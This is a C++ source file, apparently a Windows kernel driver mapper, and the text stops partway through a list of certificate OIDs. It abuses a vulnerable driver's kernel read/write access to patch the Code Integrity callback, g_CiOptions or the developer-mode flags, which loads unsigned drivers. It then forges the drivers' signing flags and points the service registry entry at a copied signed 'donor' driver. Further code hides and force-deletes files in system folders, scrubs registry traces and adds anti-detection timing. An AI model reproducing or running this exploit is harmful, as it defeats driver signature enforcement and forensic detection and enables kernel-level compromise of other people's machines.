
#include "Mapper.h"
#include "EmbeddedDriver.h"
#include <Shlwapi.h>
#include <cstdio>
#include <tlhelp32.h>
#include <string>
#include <initguid.h>
#include <wintrust.h>
#include <softpub.h>
#include <wincrypt.h>

#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "wintrust.lib")

namespace Utils {

    std::wstring GenerateRandomName(size_t length) {
        static const wchar_t charset[] = L"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
        static std::random_device rd;
        static std::mt19937 gen(rd());
        static std::uniform_int_distribution<> dist(0, static_cast<int>(wcslen(charset) - 1));

        std::wstring result;
        result.reserve(length);

        for (size_t i = 0; i < length; i++) {
            result += charset[dist(gen)];
        }

        return result;
    }

    BOOL InitializeNtFunctions() {
        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
        if (!ntdll) {
            ntdll = LoadLibraryW(L"ntdll.dll");
            if (!ntdll) {
                return FALSE;
            }
        }

        NtQuerySystemInformationPtr = reinterpret_cast<pNtQuerySystemInformation>(
            GetProcAddress(ntdll, "NtQuerySystemInformation")
        );

        NtLoadDriverPtr = reinterpret_cast<pNtLoadDriver>(
            GetProcAddress(ntdll, "NtLoadDriver")
        );

        NtUnloadDriverPtr = reinterpret_cast<pNtUnloadDriver>(
            GetProcAddress(ntdll, "NtUnloadDriver")
        );

        RtlAdjustPrivilegePtr = reinterpret_cast<pRtlAdjustPrivilege>(
            GetProcAddress(ntdll, "RtlAdjustPrivilege")
        );

        RtlGetFullPathName_UExPtr = reinterpret_cast<pRtlGetFullPathName_UEx>(
            GetProcAddress(ntdll, "RtlGetFullPathName_UEx")
        );

        RtlCreateRegistryKeyPtr = reinterpret_cast<pRtlCreateRegistryKey>(
            GetProcAddress(ntdll, "RtlCreateRegistryKey")
        );

        RtlWriteRegistryValuePtr = reinterpret_cast<pRtlWriteRegistryValue>(
            GetProcAddress(ntdll, "RtlWriteRegistryValue")
        );

        NtDeviceIoControlFilePtr = reinterpret_cast<pNtDeviceIoControlFile>(
            GetProcAddress(ntdll, "NtDeviceIoControlFile")
        );

        NtDeleteKeyPtr = reinterpret_cast<pNtDeleteKey>(
            GetProcAddress(ntdll, "NtDeleteKey")
        );

        NtOpenKeyPtr = reinterpret_cast<pNtOpenKey>(
            GetProcAddress(ntdll, "NtOpenKey")
        );

        NtFlushKeyPtr = reinterpret_cast<pNtFlushKey>(
            GetProcAddress(ntdll, "NtFlushKey")
        );


        NtCreateFilePtr = reinterpret_cast<pNtCreateFile>(
            GetProcAddress(ntdll, "NtCreateFile")
        );
        NtSetInformationFilePtr = reinterpret_cast<pNtSetInformationFile>(
            GetProcAddress(ntdll, "NtSetInformationFile")
        );

        return NtQuerySystemInformationPtr && NtLoadDriverPtr &&
               NtUnloadDriverPtr && RtlAdjustPrivilegePtr &&
               RtlGetFullPathName_UExPtr && RtlCreateRegistryKeyPtr &&
               RtlWriteRegistryValuePtr && NtDeviceIoControlFilePtr;
    }

    NTSTATUS AdjustPrivilege(ULONG privilege, BOOLEAN enable) {
        BOOLEAN wasEnabled;
        return RtlAdjustPrivilegePtr(privilege, enable, FALSE, &wasEnabled);
    }

    NTSTATUS GetFullPath(PCWSTR fileName, PWSTR buffer, ULONG bufferLength) {
        return RtlGetFullPathName_UExPtr(fileName, bufferLength, buffer, nullptr, nullptr);
    }

    BOOL SecureDeleteFile(PCWSTR filePath) {
        HANDLE hFile = CreateFileW(
            filePath,
            GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_DELETE,
            nullptr,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            nullptr
        );

        if (hFile != INVALID_HANDLE_VALUE) {
            LARGE_INTEGER fileSize;
            if (GetFileSizeEx(hFile, &fileSize) && fileSize.QuadPart > 0) {
                DWORD chunkSize = 4096;
                BYTE zeroBuffer[4096];
                SecureZeroMemory(zeroBuffer, sizeof(zeroBuffer));

                SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);
                LONGLONG remaining = fileSize.QuadPart;
                while (remaining > 0) {
                    DWORD toWrite = static_cast<DWORD>(min(static_cast<LONGLONG>(chunkSize), remaining));
                    DWORD written = 0;
                    WriteFile(hFile, zeroBuffer, toWrite, &written, nullptr);
                    remaining -= written;
                    if (written == 0) break;
                }
                FlushFileBuffers(hFile);
            }
            CloseHandle(hFile);
        }

        SetFileAttributesW(filePath, FILE_ATTRIBUTE_NORMAL);
        return DeleteFileW(filePath);
    }


    BOOL PosixDeleteFile(PCWSTR filePath) {
        if (!filePath || !NtCreateFilePtr || !NtSetInformationFilePtr)
            return FALSE;


        WCHAR ntPath[520] = {};
        wcscpy_s(ntPath, L"\\??\\");
        wcscat_s(ntPath, filePath);

        UNICODE_STRING uniPath;
        RtlInitUnicodeString(&uniPath, ntPath);

        OBJECT_ATTRIBUTES objAttr;
        InitializeObjectAttributes(&objAttr, &uniPath,
            OBJ_CASE_INSENSITIVE, NULL, NULL);

        HANDLE fileHandle = NULL;
        IO_STATUS_BLOCK ioStatus = {};

        NTSTATUS status = NtCreateFilePtr(
            &fileHandle,
            DELETE | SYNCHRONIZE,
            &objAttr,
            &ioStatus,
            NULL,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            FILE_OPEN,
            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
            NULL, 0
        );

        if (!NT_SUCCESS(status))
            return FALSE;


        struct {
            ULONG Flags;
        } dispEx;
        dispEx.Flags = 0x1
                     | 0x2
                     | 0x10;

        status = NtSetInformationFilePtr(
            fileHandle, &ioStatus,
            &dispEx, sizeof(dispEx),
            static_cast<FILE_INFORMATION_CLASS>(64)
        );

        NtClose(fileHandle);
        return NT_SUCCESS(status);
    }


    std::wstring GetRandomSystemDirectory() {
        WCHAR winDir[MAX_PATH] = {};
        DWORD winLen = GetWindowsDirectoryW(winDir, MAX_PATH);
        if (winLen == 0 || winLen >= MAX_PATH)
            return L"";

        WCHAR programData[MAX_PATH] = {};
        DWORD pdLen = GetEnvironmentVariableW(L"ProgramData", programData, MAX_PATH);


        std::wstring candidates[12];
        int count = 0;


        candidates[count++] = std::wstring(winDir) + L"\\Temp";


        candidates[count++] = std::wstring(winDir) + L"\\SoftwareDistribution\\Download";


        candidates[count++] = std::wstring(winDir) + L"\\Prefetch";


        candidates[count++] = std::wstring(winDir) + L"\\ServiceProfiles\\LocalService\\AppData\\Local\\Temp";


        candidates[count++] = std::wstring(winDir) + L"\\Logs\\MoSetup";


        candidates[count++] = std::wstring(winDir) + L"\\INF";

        if (pdLen > 0 && pdLen < MAX_PATH) {

            candidates[count++] = std::wstring(programData) + L"\\Microsoft\\Windows\\WER\\Temp";
            candidates[count++] = std::wstring(programData) + L"\\Microsoft\\Windows\\Caches";
            candidates[count++] = std::wstring(programData) + L"\\Microsoft\\Crypto\\RSA\\MachineKeys";
            candidates[count++] = std::wstring(programData) + L"\\USOShared\\Logs";
        }


        static std::mt19937 rng(static_cast<unsigned int>(__rdtsc()));
        for (int i = count - 1; i > 0; i--) {
            std::uniform_int_distribution<int> dist(0, i);
            int j = dist(rng);
            std::swap(candidates[i], candidates[j]);
        }

        for (int i = 0; i < count; i++) {
            DWORD attr = GetFileAttributesW(candidates[i].c_str());
            if (attr == INVALID_FILE_ATTRIBUTES)
                continue;
            if (!(attr & FILE_ATTRIBUTE_DIRECTORY))
                continue;


            std::wstring probe = candidates[i] + L"\\" + GenerateRandomName(8) + L".tmp";
            HANDLE hProbe = CreateFileW(probe.c_str(), GENERIC_WRITE, 0, nullptr,
                CREATE_NEW, FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE, nullptr);
            if (hProbe != INVALID_HANDLE_VALUE) {
                CloseHandle(hProbe);
                return candidates[i];
            }
        }


        return std::wstring(winDir) + L"\\Temp";
    }

    BOOL ForceDeleteOrRename(PCWSTR filePath) {

        if (DeleteFileW(filePath)) {
            return TRUE;
        }


        if (PosixDeleteFile(filePath)) {
            return TRUE;
        }


        std::wstring hideDir = GetRandomSystemDirectory();
        if (!hideDir.empty()) {
            std::wstring newName = hideDir + L"\\" + GenerateRandomName(16) + L".tmp";
            if (MoveFileW(filePath, newName.c_str())) {
                SetFileAttributesW(newName.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);
                MoveFileExW(newName.c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
                return TRUE;
            }
        }


        SetFileAttributesW(filePath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);
        MoveFileExW(filePath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
        return FALSE;
    }

    std::wstring GetTempFilePath(PCWSTR extension) {
        std::wstring dir = GetRandomSystemDirectory();
        if (dir.empty())
            return L"";

        std::wstring name = GenerateRandomName(12);
        return dir + L"\\" + name + extension;
    }


}

namespace MapperCore {

    NTSTATUS TriggerExploit(PCWSTR targetDriverFileName, PCWSTR sentinelDriverFileName) {
        HANDLE deviceHandle = nullptr;
        NTSTATUS status = VulnDriver::OpenDevice(&deviceHandle);

        if (!NT_SUCCESS(status)) {
            status = DriverLoader::LoadDriver(g_LoaderServicePath);

            if (!NT_SUCCESS(status) &&
                status != STATUS_OBJECT_NAME_COLLISION &&
                status != STATUS_IMAGE_ALREADY_LOADED) {
                return status;
            }
            for (int retry = 0; retry < 10; retry++) {
                Sleep(100);
                status = VulnDriver::OpenDevice(&deviceHandle);
                if (NT_SUCCESS(status)) break;
            }

            if (!NT_SUCCESS(status)) {
                return status;
            }
        }
        {
            PVOID ciValidateImageHeaderEntry = nullptr;
            PVOID zwFlushInstructionCache = nullptr;

            if (KernelUtils::GetCiValidateImageHeaderEntry(&ciValidateImageHeaderEntry, &zwFlushInstructionCache) &&
                ciValidateImageHeaderEntry && zwFlushInstructionCache) {

                PVOID originalCallback = nullptr;
                status = VulnDriver::ReadKernelMemory(deviceHandle, ciValidateImageHeaderEntry, &originalCallback, sizeof(PVOID));
                if (NT_SUCCESS(status)) {
                    g_OriginalCiCallback = originalCallback;
                    g_CiCallbackAddress = ciValidateImageHeaderEntry;

                    status = VulnDriver::WriteKernelMemory(deviceHandle, ciValidateImageHeaderEntry, &zwFlushInstructionCache, sizeof(PVOID));
                    if (NT_SUCCESS(status)) {
                        g_CiCallbackPatched = true;
                        status = DriverLoader::LoadDriver(g_DriverServicePath);
                        NTSTATUS sentStatus = STATUS_UNSUCCESSFUL;
                        if (NT_SUCCESS(status) && sentinelDriverFileName && g_SentinelServicePath[0]) {
                            sentStatus = DriverLoader::LoadDriver(g_SentinelServicePath);
                        }

                        VulnDriver::WriteKernelMemory(deviceHandle, ciValidateImageHeaderEntry, &originalCallback, sizeof(PVOID));
                        g_CiCallbackPatched = false;
                        if (NT_SUCCESS(status)) {
                            KernelUtils::PatchDriverSigningFlags(deviceHandle, targetDriverFileName);
                            if (NT_SUCCESS(sentStatus) && sentinelDriverFileName) {
                                KernelUtils::PatchDriverSigningFlags(deviceHandle, sentinelDriverFileName);
                            }
                            goto done;
                        }
                    }
                }
            }
        }


        {
            PVOID ciOptionsAddr = nullptr;
            if (KernelUtils::GetCiOptionsAddress(&ciOptionsAddr)) {
                DWORD currentOptions = 0;
                status = VulnDriver::ReadKernelMemory(deviceHandle, ciOptionsAddr, &currentOptions, sizeof(DWORD));
                if (NT_SUCCESS(status)) {
                    g_CiOptionsAddress = ciOptionsAddr;
                    g_OriginalCiOptions = currentOptions;

                    DWORD patchedOptions = currentOptions | 0x8;
                    status = VulnDriver::WriteKernelMemory(deviceHandle, ciOptionsAddr, &patchedOptions, sizeof(DWORD));
                    if (NT_SUCCESS(status)) {
                        g_CiOptionsPatched = true;
                        status = DriverLoader::LoadDriver(g_DriverServicePath);
                        NTSTATUS sentStatus = STATUS_UNSUCCESSFUL;
                        if (NT_SUCCESS(status) && sentinelDriverFileName && g_SentinelServicePath[0]) {
                            sentStatus = DriverLoader::LoadDriver(g_SentinelServicePath);
                        }

                        VulnDriver::WriteKernelMemory(deviceHandle, ciOptionsAddr, &g_OriginalCiOptions, sizeof(DWORD));
                        g_CiOptionsPatched = false;
                        if (NT_SUCCESS(status)) {
                            KernelUtils::PatchDriverSigningFlags(deviceHandle, targetDriverFileName);
                            if (NT_SUCCESS(sentStatus) && sentinelDriverFileName) {
                                KernelUtils::PatchDriverSigningFlags(deviceHandle, sentinelDriverFileName);
                            }
                            goto done;
                        }
                    }
                }
            }
        }


        {
            PVOID ciDevModeAddr = nullptr;
            if (KernelUtils::GetCiDeveloperModeAddress(&ciDevModeAddr)) {
                DWORD currentDevMode = 0;
                status = VulnDriver::ReadKernelMemory(deviceHandle, ciDevModeAddr, &currentDevMode, sizeof(DWORD));
                if (NT_SUCCESS(status)) {
                    g_CiDevModeAddress = ciDevModeAddr;
                    g_OriginalCiDevMode = currentDevMode;


                    DWORD patchedDevMode = currentDevMode | 0x200 | 0x8000;
                    status = VulnDriver::WriteKernelMemory(deviceHandle, ciDevModeAddr, &patchedDevMode, sizeof(DWORD));
                    if (NT_SUCCESS(status)) {
                        g_CiDevModePatched = true;
                        status = DriverLoader::LoadDriver(g_DriverServicePath);
                        NTSTATUS sentStatus = STATUS_UNSUCCESSFUL;
                        if (NT_SUCCESS(status) && sentinelDriverFileName && g_SentinelServicePath[0]) {
                            sentStatus = DriverLoader::LoadDriver(g_SentinelServicePath);
                        }

                        VulnDriver::WriteKernelMemory(deviceHandle, ciDevModeAddr, &g_OriginalCiDevMode, sizeof(DWORD));
                        g_CiDevModePatched = false;
                        if (NT_SUCCESS(status)) {
                            KernelUtils::PatchDriverSigningFlags(deviceHandle, targetDriverFileName);
                            if (NT_SUCCESS(sentStatus) && sentinelDriverFileName) {
                                KernelUtils::PatchDriverSigningFlags(deviceHandle, sentinelDriverFileName);
                            }
                            goto done;
                        }
                    }
                }
            }
            status = STATUS_UNSUCCESSFUL;
        }

done:


        if (NT_SUCCESS(status) && sentinelDriverFileName && g_SentinelServicePath[0]) {

            ULONG sentImageSize = 0;
            PVOID sentBase = KernelUtils::GetDriverBaseByName(sentinelDriverFileName, &sentImageSize);
            if (sentBase) {
                g_SentinelLoadAddress = sentBase;
                g_SentinelImageSize = sentImageSize;
                ULONG whoswhoImageSize = 0;
                PVOID whoswhoBase = KernelUtils::GetDriverBaseByName(targetDriverFileName, &whoswhoImageSize);
                if (whoswhoBase) {
                    g_DriverLoadAddress = whoswhoBase;
                    if (WriteSentinelGlobals(deviceHandle, sentBase, sentImageSize,
                                             whoswhoBase, whoswhoImageSize)) {
                    } else {
                    }
                } else {
                }
            } else {
            }
        }


        VulnDriver::CloseDevice(deviceHandle);
        DriverLoader::UnloadDriver(g_LoaderServicePath);

        return status;
    }

    NTSTATUS WindLoadDriver(PCWSTR loaderPath, PCWSTR driverPath, PCWSTR sentinelPath) {
        NTSTATUS status = Utils::AdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE);
        if (!NT_SUCCESS(status)) {
            return status;
        }

        WCHAR loaderFullPath[520];
        status = Utils::GetFullPath(loaderPath, loaderFullPath, sizeof(loaderFullPath));
        if (!NT_SUCCESS(status)) {
            return status;
        }

        WCHAR driverFullPath[520];
        status = Utils::GetFullPath(driverPath, driverFullPath, sizeof(driverFullPath));
        if (!NT_SUCCESS(status)) {
            return status;
        }

        status = DriverLoader::CreateDriverService(g_DriverServicePath, driverFullPath);
        if (!NT_SUCCESS(status)) {
            return status;
        }

        status = DriverLoader::CreateDriverService(g_LoaderServicePath, loaderFullPath);
        if (!NT_SUCCESS(status)) {
            return status;
        }


        WCHAR sentinelFullPath[520] = {};
        if (sentinelPath && sentinelPath[0]) {
            status = Utils::GetFullPath(sentinelPath, sentinelFullPath, sizeof(sentinelFullPath));
            if (!NT_SUCCESS(status)) {
                return status;
            }
            status = DriverLoader::CreateDriverService(g_SentinelServicePath, sentinelFullPath);
            if (!NT_SUCCESS(status)) {
                return status;
            }
        }

        WCHAR donorPath[MAX_PATH] = {};
        BOOL donorIsEV = FALSE;
        BOOL donorFound = FALSE;
        WCHAR donorCopyPath[520] = {};

        {


            WCHAR driversDir[MAX_PATH];
            GetSystemDirectoryW(driversDir, MAX_PATH);
            wcscat_s(driversDir, L"\\drivers");

            WIN32_FIND_DATAW fd;
            WCHAR searchPat[MAX_PATH];
            wcscpy_s(searchPat, driversDir);
            wcscat_s(searchPat, L"\\*.sys");
            HANDLE hFind = FindFirstFileW(searchPat, &fd);
            int bestScore = 0;
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
                    if (fd.nFileSizeLow < 8192) continue;
                    WCHAR fullPath[MAX_PATH];
                    wcscpy_s(fullPath, driversDir);
                    wcscat_s(fullPath, L"\\");
                    wcscat_s(fullPath, fd.cFileName);


                    HANDLE hf = CreateFileW(fullPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                        nullptr, OPEN_EXISTING, 0, nullptr);
                    if (hf == INVALID_HANDLE_VALUE) continue;
                    BYTE hdr[4096];
                    DWORD br = 0;
                    BOOL readOk = ReadFile(hf, hdr, sizeof(hdr), &br, nullptr);
                    CloseHandle(hf);
                    if (!readOk || br < 512) continue;

                    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hdr;
                    if (dos->e_magic != IMAGE_DOS_SIGNATURE) continue;
                    if ((DWORD)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS64) > br) continue;
                    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(hdr + dos->e_lfanew);
                    if (nt->Signature != IMAGE_NT_SIGNATURE) continue;
                    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) continue;
                    PIMAGE_NT_HEADERS64 nt64 = (PIMAGE_NT_HEADERS64)nt;
                    if (nt64->OptionalHeader.NumberOfRvaAndSizes <= IMAGE_DIRECTORY_ENTRY_SECURITY) continue;
                    if (nt64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress == 0) continue;
                    if (nt64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size < 128) continue;


                    WINTRUST_FILE_INFO wfi = {};
                    wfi.cbStruct = sizeof(wfi);
                    wfi.pcwszFilePath = fullPath;
                    GUID actionGUID = WINTRUST_ACTION_GENERIC_VERIFY_V2;
                    WINTRUST_DATA wtd = {};
                    wtd.cbStruct = sizeof(wtd);
                    wtd.dwUIChoice = WTD_UI_NONE;
                    wtd.fdwRevocationChecks = WTD_REVOKE_NONE;
                    wtd.dwUnionChoice = WTD_CHOICE_FILE;
                    wtd.pFile = &wfi;
                    wtd.dwStateAction = WTD_STATEACTION_VERIFY;
                    wtd.dwProvFlags = WTD_CACHE_ONLY_URL_RETRIEVAL;
                    LONG lStatus = WinVerifyTrust(NULL, &actionGUID, &wtd);
                    wtd.dwStateAction = WTD_STATEACTION_CLOSE;
                    WinVerifyTrust(NULL, &actionGUID, &wtd);

                    int score = (lStatus == ERROR_SUCCESS) ? 100 : 0;
                    if (score > bestScore) {
                        bestScore = score;
                        wcscpy_s(donorPath, fullPath);
                    }
                    if (bestScore >= 100) break;
                } while (FindNextFileW(hFind, &fd));
                FindClose(hFind);
            }
            donorFound = (bestScore > 0);
        }

        if (donorFound && donorPath[0]) {
            PCWSTR targetDir = driverFullPath;
            PCWSTR lastSlash = wcsrchr(driverFullPath, L'\\');
            WCHAR targetDirBuf[520] = {};
            if (lastSlash) {
                wcsncpy_s(targetDirBuf, driverFullPath, lastSlash - driverFullPath + 1);
            } else {
                wcscpy_s(targetDirBuf, L".\\");
            }
            std::wstring donorCopyName = Utils::GenerateRandomName(10) + L".sys";
            wcscpy_s(donorCopyPath, targetDirBuf);
            wcscat_s(donorCopyPath, donorCopyName.c_str());
            if (!CopyFileW(donorPath, donorCopyPath, FALSE)) {
                donorFound = FALSE;
            } else {

                SetFileAttributesW(donorCopyPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
                MoveFileExW(donorCopyPath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
                wcscpy_s(g_DonorCopyPath, donorCopyPath);
            }
        }

        PCWSTR targetFileName = wcsrchr(driverFullPath, L'\\');
        if (targetFileName) targetFileName++;
        else targetFileName = driverFullPath;


        PCWSTR sentinelFileName = nullptr;
        if (sentinelFullPath[0]) {
            sentinelFileName = wcsrchr(sentinelFullPath, L'\\');
            if (sentinelFileName) sentinelFileName++;
            else sentinelFileName = sentinelFullPath;
        }

        status = TriggerExploit(targetFileName, sentinelFileName);
        if (NT_SUCCESS(status)) {
            if (Utils::ForceDeleteOrRename(driverFullPath)) {
            } else {
            }

            if (sentinelFullPath[0]) {
                if (Utils::ForceDeleteOrRename(sentinelFullPath)) {
                } else {
                }
            }
        }


        if (NT_SUCCESS(status) && donorFound && donorCopyPath[0] && RtlWriteRegistryValuePtr) {

            WCHAR ntDonorPath[520] = {};
            wcscpy_s(ntDonorPath, L"\\??\\");
            wcscat_s(ntDonorPath, donorCopyPath);
            SIZE_T ntDonorLen = wcslen(ntDonorPath);

            NTSTATUS regStatus = RtlWriteRegistryValuePtr(
                0, g_DriverServicePath, L"ImagePath", REG_SZ,
                ntDonorPath, static_cast<ULONG>((ntDonorLen + 1) * sizeof(WCHAR)));

            if (NT_SUCCESS(regStatus)) {
            } else {
            }
        }

        return status;
    }

    BOOL WriteSentinelGlobals(HANDLE device, PVOID sentinelBase, ULONG sentinelImageSize,
                              PVOID whoswhoBase, ULONG whoswhoSize) {


        IMAGE_DOS_HEADER dosHeader = {};
        NTSTATUS status = VulnDriver::ReadKernelMemory(device, sentinelBase, &dosHeader, sizeof(dosHeader));
        if (!NT_SUCCESS(status) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
            return FALSE;
        }


        PVOID ntHeaderAddr = reinterpret_cast<PVOID>(
            reinterpret_cast<ULONG_PTR>(sentinelBase) + dosHeader.e_lfanew);

        IMAGE_NT_HEADERS64 ntHeaders = {};
        status = VulnDriver::ReadKernelMemory(device, ntHeaderAddr, &ntHeaders, sizeof(ntHeaders));
        if (!NT_SUCCESS(status) || ntHeaders.Signature != IMAGE_NT_SIGNATURE) {
            return FALSE;
        }


        ULONG_PTR sectionTableAddr =
            reinterpret_cast<ULONG_PTR>(ntHeaderAddr) +
            offsetof(IMAGE_NT_HEADERS64, OptionalHeader) +
            ntHeaders.FileHeader.SizeOfOptionalHeader;

        WORD numSections = ntHeaders.FileHeader.NumberOfSections;
        if (numSections > 64) numSections = 64;


        IMAGE_SECTION_HEADER sections[64] = {};
        status = VulnDriver::ReadKernelMemory(
            device,
            reinterpret_cast<PVOID>(sectionTableAddr),
            sections,
            numSections * sizeof(IMAGE_SECTION_HEADER));

        if (!NT_SUCCESS(status)) {
            return FALSE;
        }


        PVOID sntlKernelAddr = nullptr;
        ULONG sntlSize = 0;
        for (WORD i = 0; i < numSections; i++) {
            if (memcmp(sections[i].Name, ".sntl\0\0\0", 8) == 0) {
                sntlKernelAddr = reinterpret_cast<PVOID>(
                    reinterpret_cast<ULONG_PTR>(sentinelBase) + sections[i].VirtualAddress);
                sntlSize = sections[i].Misc.VirtualSize;
                break;
            }
        }

        if (!sntlKernelAddr) {
            return FALSE;
        }


        if (sntlSize < 0x14) {
            return FALSE;
        }


        PVOID baseSlotAddr = sntlKernelAddr;
        status = VulnDriver::WriteKernelMemory(device, baseSlotAddr, &whoswhoBase, sizeof(PVOID));
        if (!NT_SUCCESS(status)) {
            return FALSE;
        }


        if (whoswhoSize > 0) {
            PVOID sizeSlotAddr = reinterpret_cast<PVOID>(
                reinterpret_cast<ULONG_PTR>(sntlKernelAddr) + 0x10);
            status = VulnDriver::WriteKernelMemory(device, sizeSlotAddr, &whoswhoSize, sizeof(ULONG));
            if (!NT_SUCCESS(status)) {
            } else {
            }
        }

        return TRUE;
    }

    NTSTATUS RestoreCiCallback(HANDLE device) {
        NTSTATUS status = STATUS_SUCCESS;


        if (g_CiDevModePatched && g_CiDevModeAddress) {
            status = VulnDriver::WriteKernelMemory(device, g_CiDevModeAddress, &g_OriginalCiDevMode, sizeof(DWORD));
            if (NT_SUCCESS(status)) {
                g_CiDevModePatched = false;
            }
        }


        if (g_CiOptionsPatched && g_CiOptionsAddress) {
            status = VulnDriver::WriteKernelMemory(device, g_CiOptionsAddress, &g_OriginalCiOptions, sizeof(DWORD));
            if (NT_SUCCESS(status)) {
                g_CiOptionsPatched = false;
            }
        }


        if (g_CiCallbackPatched && g_CiCallbackAddress && g_OriginalCiCallback) {
            AntiDetect::TimingJitter();
            status = VulnDriver::WriteKernelMemory(device, g_CiCallbackAddress, &g_OriginalCiCallback, sizeof(PVOID));
            if (NT_SUCCESS(status)) {
                g_CiCallbackPatched = false;
                AntiDetect::MemoryBarrier();
            }
        }

        return status;
    }

    NTSTATUS CleanupArtifacts() {
        auto deleteRegistryTree = [](PCWSTR registryPath) -> NTSTATUS {
            if (!registryPath || wcslen(registryPath) < 10) {
                return STATUS_INVALID_PARAMETER;
            }

            if (NtDeleteKeyPtr && NtOpenKeyPtr) {
                UNICODE_STRING keyName;
                RtlInitUnicodeString(&keyName, registryPath);

                OBJECT_ATTRIBUTES objAttr;
                InitializeObjectAttributes(&objAttr, &keyName, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

                HANDLE hKey = nullptr;
                NTSTATUS st = NtOpenKeyPtr(&hKey, DELETE | KEY_ENUMERATE_SUB_KEYS, &objAttr);
                if (NT_SUCCESS(st)) {
                    WCHAR subKeyPath[512];
                    const WCHAR* subKeys[] = { L"\\Enum", L"\\Security", L"\\Parameters" };
                    for (int i = 0; i < 3; i++) {
                        wcscpy_s(subKeyPath, registryPath);
                        wcscat_s(subKeyPath, subKeys[i]);

                        UNICODE_STRING subName;
                        RtlInitUnicodeString(&subName, subKeyPath);

                        OBJECT_ATTRIBUTES subAttr;
                        InitializeObjectAttributes(&subAttr, &subName, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

                        HANDLE hSubKey = nullptr;
                        NTSTATUS subSt = NtOpenKeyPtr(&hSubKey, DELETE, &subAttr);
                        if (NT_SUCCESS(subSt)) {
                            NtDeleteKeyPtr(hSubKey);
                            NtClose(hSubKey);
                        }
                    }

                    if (NtFlushKeyPtr) {
                        NtFlushKeyPtr(hKey);
                    }
                    NtDeleteKeyPtr(hKey);
                    NtClose(hKey);
                    return STATUS_SUCCESS;
                }
            }

            WCHAR regPath[256];
            if (wcslen(registryPath) > 18) {
                wcscpy_s(regPath, registryPath + 18);
                SHDeleteKeyW(HKEY_LOCAL_MACHINE, regPath);
            }

            return STATUS_SUCCESS;
        };

        if (wcslen(g_LoaderServicePath) > 0) {
            deleteRegistryTree(g_LoaderServicePath);
        }


        if (wcslen(g_DriverServicePath) > 0 && g_DonorCopyPath[0] == L'\0') {
            deleteRegistryTree(g_DriverServicePath);
        }


        if (wcslen(g_SentinelServicePath) > 0) {
            deleteRegistryTree(g_SentinelServicePath);
        }

        return STATUS_SUCCESS;
    }

}

static void RunSignatureCheck(LPCWSTR filePath) {
    if (g_KernelSigningVerified) {
    } else {
        if (g_DriverLoadAddress) {
        }
    }


    LPCWSTR checkPath = filePath;
    BOOL isStomped = FALSE;
    if (g_DonorCopyPath[0] != L'\0') {
        checkPath = g_DonorCopyPath;
        isStomped = TRUE;
    }

    if (isStomped) {
    }

    WINTRUST_FILE_INFO fileInfo = {};
    fileInfo.cbStruct = sizeof(WINTRUST_FILE_INFO);
    fileInfo.pcwszFilePath = checkPath;

    GUID actionGUID = WINTRUST_ACTION_GENERIC_VERIFY_V2;

    WINTRUST_DATA trustData = {};
    trustData.cbStruct = sizeof(WINTRUST_DATA);
    trustData.dwUIChoice = WTD_UI_NONE;
    trustData.fdwRevocationChecks = WTD_REVOKE_NONE;
    trustData.dwUnionChoice = WTD_CHOICE_FILE;
    trustData.pFile = &fileInfo;
    trustData.dwStateAction = WTD_STATEACTION_VERIFY;
    trustData.dwProvFlags = WTD_CACHE_ONLY_URL_RETRIEVAL;

    LONG lStatus = WinVerifyTrust(NULL, &actionGUID, &trustData);

    BOOL isEV = FALSE;
    char signerNameA[256] = {};
    BOOL hasCert = FALSE;
    BOOL hasTimestamp = FALSE;

    if (trustData.hWVTStateData) {
        CRYPT_PROVIDER_DATA* prov = WTHelperProvDataFromStateData(trustData.hWVTStateData);
        if (prov) {
            CRYPT_PROVIDER_SGNR* sgnr = WTHelperGetProvSignerFromChain(prov, 0, FALSE, 0);
            if (sgnr) {
                hasTimestamp = (sgnr->csCounterSigners > 0);
                if (sgnr->pChainContext && sgnr->pChainContext->cChain > 0) {
                    hasCert = TRUE;
                    CERT_SIMPLE_CHAIN* chain = sgnr->pChainContext->rgpChain[0];
                    if (chain->cElement > 0) {
                        PCCERT_CONTEXT leafCert = chain->rgpElement[0]->pCertContext;
                        CertGetNameStringA(leafCert, CERT_NAME_SIMPLE_DISPLAY_TYPE, 0,
                            NULL, signerNameA, sizeof(signerNameA));

                        static const char* evOIDs[] = {
                            "2.23.140.1.1",
                            "2.23.140.1.3",
                            "2.23.140.1.4.1",
                            "1.3.6.1.4.1.311.94.1.1",
                            "2.16.840.1.114414.1.7.23.3",
                            "2.16.840.1.113733.1.7.23.6",
                            "2.16.840.1.113733.1.7.48.1",
